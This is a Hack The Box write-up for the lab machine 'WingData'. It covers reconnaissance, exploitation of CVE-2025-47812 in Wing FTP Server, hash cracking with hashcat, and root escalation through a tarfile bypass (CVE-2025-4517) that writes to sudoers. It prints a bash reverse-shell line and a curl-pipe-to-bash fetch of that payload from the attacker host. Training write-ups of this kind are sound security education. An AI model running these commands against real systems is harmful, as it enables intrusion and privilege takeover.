# 🚀 Hack The Box - WingData Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **WingData** | `10.129.63.65`| Easy | Linux | **SOLVED** ✅ |

<img width="891" height="616" alt="Screenshot 2026-05-19 222745" src="https://github.com/user-attachments/assets/6e2872bb-057c-4176-85c4-0eb5c8ebb063" />

---

## 1. Environment Setup & Reconnaissance

### Initial Connectivity Test
An initial connectivity test was performed using the `ping` utility to verify that the target host was active and to estimate the operating system type based on the TTL value

```bash
ping -c 4 10.129.63.65
```

<img width="848" height="133" alt="Screenshot 2026-05-19 201013" src="https://github.com/user-attachments/assets/81d18ba8-f239-468d-94fc-81b45bea2c9e" />

### The results showed a stable response with a TTL value of 63, indicating a Linux-based target.

## Local DNS Mapping
The local /etc/hosts file was updated to map the target IP address to the primary domain and the identified FTP subdomain.

```bash
echo "10.129.63.65 wingdata.htb" | sudo tee -a /etc/hosts
echo "10.129.63.65 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```
<img width="810" height="129" alt="Screenshot 2026-05-19 202254" src="https://github.com/user-attachments/assets/ccb5512d-2878-44fc-9904-d8c1bafc8915" />


## 2. Scanning & Enumeration
Network Scanning (Nmap)
An aggressive port scan was executed using nmap to identify active services and their respective versions running on the target host.

```Bash
nmap -sC -sV -A 10.129.63.65
```
<img width="1919" height="577" alt="Screenshot 2026-05-19 202103" src="https://github.com/user-attachments/assets/59acefe7-714c-48f1-92f6-80d12102970b" />

Key Open Ports:

Port 22/tcp: SSH (OpenSSH 9.2p1 Debian 2+deb12u7)
Port 80/tcp: HTTP (Apache httpd 2.4.66)
HTTP Title: WingData Solutions


### Directory Brute-Forcing (ffuf)
Fuzzing was conducted on the main domain using ffuf alongside the common.txt wordlist to discover hidden directories and files.

```bash
ffuf -u [http://wingdata.htb/FUZZ](http://wingdata.htb/FUZZ) -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```

<img width="1223" height="533" alt="Screenshot 2026-05-19 204452" src="https://github.com/user-attachments/assets/e8dcb861-1ec3-4405-8921-22310f024264" />

## 3. Web Service & Vulnerability Identification
### Web Analysis
Accessing the main domain http://wingdata.htb displayed a landing page for a secure data transfer service. Navigating to the client portal on the subdomain

<img width="1919" height="892" alt="Screenshot 2026-05-19 202140" src="https://github.com/user-attachments/assets/560f201d-061f-4a8b-aec1-9975bbfbd2e1" />
<img width="1919" height="846" alt="Screenshot 2026-05-19 202234" src="https://github.com/user-attachments/assets/0b36311c-ca2a-49c9-a2a8-029fabef25f1" />

http://ftp.wingdata.htb/login.html revealed a web application authentication page.
"we need to add and im done in the first time /etc/hosts"

At the bottom of the login form, the specific software version in use was explicitly stated:
<img width="1913" height="886" alt="Screenshot 2026-05-19 202304" src="https://github.com/user-attachments/assets/9c685a95-f919-4e58-9ae6-80aa8c7ab204" />


FTP server software powered by Wing FTP Server v7.4.3

### Vulnerability Research
Public exploit research regarding Wing FTP Server v7.4.3 pointed to CVE-2025-47812 (Authenticated/Anonymous Remote Code Execution). A public Proof of Concept (PoC) repository by user 4m3rr0r was selected to exploit this flaw.
<img width="1905" height="902" alt="Screenshot 2026-05-19 202427" src="https://github.com/user-attachments/assets/3965bf6a-ece0-436c-b3fd-8f4c8103e0a2" />
<img width="1507" height="345" alt="Screenshot 2026-05-19 202524" src="https://github.com/user-attachments/assets/fcd2c414-e1b6-4fc3-a5d1-684aa6389682" />

### 4. Exploitation Setup & Foothold
Creating the Reverse Shell Payload
A simple interactive shell script named shell.sh was created within the /tmp directory of the attacker machine (10.10.14.23).

```bash
cd /tmp
echo 'bash -i >& /dev/tcp/10.10.14.23/5555 0>&1' > /tmp/shell.sh
python3 -m http.server 8080
```
<img width="1107" height="111" alt="Screenshot 2026-05-19 202709" src="https://github.com/user-attachments/assets/5beabfde-98aa-490d-a6b2-1ab90dbb10ad" />
<img width="998" height="76" alt="Screenshot 2026-05-19 202725" src="https://github.com/user-attachments/assets/e7d6e916-213f-40a3-beaf-752bf6f474d8" />

### Executing the Exploit
A netcat listener was set up on port 5555, and the Python PoC script was executed to trigger the download and execution of the hosted payload scrip

```bash
python3 CVE-2025-47812.py -u [http://ftp.wingdata.htb](http://ftp.wingdata.htb) -c "curl [http://10.10.14.23:8080/shell.sh](http://10.10.14.23:8080/shell.sh)|bash" -v
```

<img width="1566" height="163" alt="Screenshot 2026-05-19 211242" src="https://github.com/user-attachments/assets/646c4b60-8401-488b-9844-baf391bca6bb" />

### The netcat listener successfully captured the reverse connection from the target host:

```bash
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.244.106] 58344
wingftp@wingdata:/opt/wftpserver$
```
<img width="926" height="138" alt="Screenshot 2026-05-19 211124" src="https://github.com/user-attachments/assets/534b63a3-99ea-48bf-9911-cdc3348888e8" />

###  4: Internal Enumeration & Directory Listing
After gaining initial access as the `wingftp` service user, a manual post-exploitation reconnaissance was conducted on the WingFTP application directory to hunt for sensitive files.

```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls -la
```
<img width="619" height="168" alt="Screenshot 2026-05-19 211832" src="https://github.com/user-attachments/assets/602469d3-17c7-4d66-8d72-daf0d23575d2" />

### Findings:
As shown below, multiple user configuration XML files (anonymous.xml, john.xml, maria.xml, steve.xml, and wacky.xml) have insecure world-readable (-rw-rw-rw-) permissions.

### StExtracting the Password Hash
Reading the configuration data inside wacky.xml revealed an exposed password hash appended with its corresponding salt value.

The hash data was copied over to the local attacker machine (Kali Linux) and saved into a file named pass.txt using the nano text editor:

```plaintext
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```
<img width="1380" height="276" alt="Screenshot 2026-05-19 212554" src="https://github.com/user-attachments/assets/be4b0cc4-ca85-47d6-bf67-e64681596b75" />


### Preparing the Wordlist
The standard rockyou.txt wordlist was extracted from its default compressed archive on Kali Linux to prepare for the dictionary attack.

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

<img width="689" height="73" alt="Screenshot 2026-05-19 212940" src="https://github.com/user-attachments/assets/02970153-0ea6-4fd4-8544-b62e081e5dc7" />

### Password Cracking via Hashcat
Since the hash pattern follows a standard SHA-256 digest constructed as $pass.$salt, Hashcat mode 1410 (sha256($pass.$salt)) was chosen to break the hash against the rockyou.txt wordlist.

```bash
hashcat -m 1410 pass.txt /usr/share/wordlists/rockyou.txt
```
<img width="1179" height="279" alt="Screenshot 2026-05-19 213250" src="https://github.com/user-attachments/assets/c612a6f1-3550-4f52-9aa4-33be5f2c2432" />
<img width="1044" height="382" alt="Screenshot 2026-05-19 213312" src="https://github.com/user-attachments/assets/5be4b331-ec09-45e2-a03c-fc3baa106800" />

### 5: Lateral Movement via SSH
Armed with the cracked credential, an SSH connection was initiated to pivot into a higher-privileged shell environment under the wacky user account.

```Bash
ssh wacky@10.129.244.106
```
<img width="977" height="315" alt="Screenshot 2026-05-19 213450" src="https://github.com/user-attachments/assets/73422d49-2280-4ed5-bf4c-ee948e0a3174" />



### Upgrading Shell TTY
To establish a more stable, interactive shell session that supports autocomplete, a TTY upgrade was performed using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 6. Post-Exploitation & System Enumeration
### User Flag
The user flag was successfully located and retrieved from the home directory of the ubuntu user.

```bash
wingftp@wingdata:/$ cat user.txt
966b96fc8bc54bfcb8be1b54b1f41bdf
```
<img width="563" height="120" alt="Screenshot 2026-05-19 213529" src="https://github.com/user-attachments/assets/119803c3-9c0d-4dc8-be19-be9c8a4e0bb6" />


##  7 : Local Enumeration & Sudo Rights Check
After successfully gaining access as the `wacky` user, a check for `sudo` privileges was conducted to find potential privilege escalation vectors.

```bash
wacky@wingdata:~$ sudo -l
```
<img width="1043" height="117" alt="Screenshot 2026-05-19 221505" src="https://github.com/user-attachments/assets/16c80a6f-c4ff-40ca-99ed-8f0742112cf9" />

Analysis: The user wacky can execute a specific backup restoration Python script (/opt/backup_clients/restore_backup_clients.py) as root without providing a password.
Inspecting the source code reveals it handles tar archive extraction using Python's tarfile module with filter="data" protections:


```bash
Python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

<img width="725" height="118" alt="Screenshot 2026-05-19 215516" src="https://github.com/user-attachments/assets/366a49f8-9990-41f5-ba30-de1278a17683" />



####  8: Identifying CVE-2025-4517 & Exploit Preparation
The application relies on a vulnerable implementation of Python's tarfile module. This setup is susceptible to CVE-2025-4517, a vulnerability allowing arbitrary file writes via a combination of symlink path traversal and hardlink manipulation— effectively bypassing the filter="data" restriction introduced in modern Python versions.

On the local attacker machine (Kali Linux), the public Proof of Concept (PoC) exploit script was cloned from GitHub:
```Bash
git clone [https://github.com/AzureADTrent/CVE-2025-4517-POC.git](https://github.com/AzureADTrent/CVE-2025-4517-POC.git)
cd CVE-2025-4517-POC
```
<img width="1916" height="964" alt="Screenshot 2026-05-19 220747" src="https://github.com/user-attachments/assets/c68199f6-c0b5-4dcc-b7ff-7c0fe025ef69" />
<img width="1670" height="280" alt="Screenshot 2026-05-19 215707" src="https://github.com/user-attachments/assets/366cb3f5-941d-42c6-a358-309530c98172" />

### An internal Python HTTP server was then started on the attacker machine to transfer the exploit code to the target:
```bash
python3 -m http.server 80
```

<img width="830" height="64" alt="Screenshot 2026-05-19 222151" src="https://github.com/user-attachments/assets/2339f8b5-65f5-4381-b5f4-c5f4846cbf94" />

### 9 Transferring the Exploit Payload
Switching back to the target session under the /tmp directory, the exploit script was downloaded from the host machine using wget:

```Bash
wacky@wingdata:/tmp$ wget [http://10.10.14.23/CVE-2025-4517-POC.py](http://10.10.14.23/CVE-2025-4517-POC.py
```
<img width="1909" height="185" alt="Screenshot 2026-05-19 222546" src="https://github.com/user-attachments/assets/067f030d-6c9b-478c-9923-3ad02743fe96" />


### Launching the Exploit & Spawning a Root Shell
The exploit script automates the creation of a malicious tar file. It tricks the vulnerable root script into writing a custom sudoers entry (wacky ALL=(ALL) NOPASSWD: ALL) via symlinks into /etc/sudoers.

The PoC script was executed targeting the local user:

```Bash
wacky@wingdata:/tmp$ python3 /tmp/CVE-2025-4517-POC.py
```
<img width="1170" height="870" alt="Screenshot 2026-05-19 222349" src="https://github.com/user-attachments/assets/f0b632f2-62e3-4c62-ab31-8d146efc3a41" />

### Root Flag
```bash
cat /root/root.txt
```



---
**Documented by**: Pagar Kristian Panjaitan
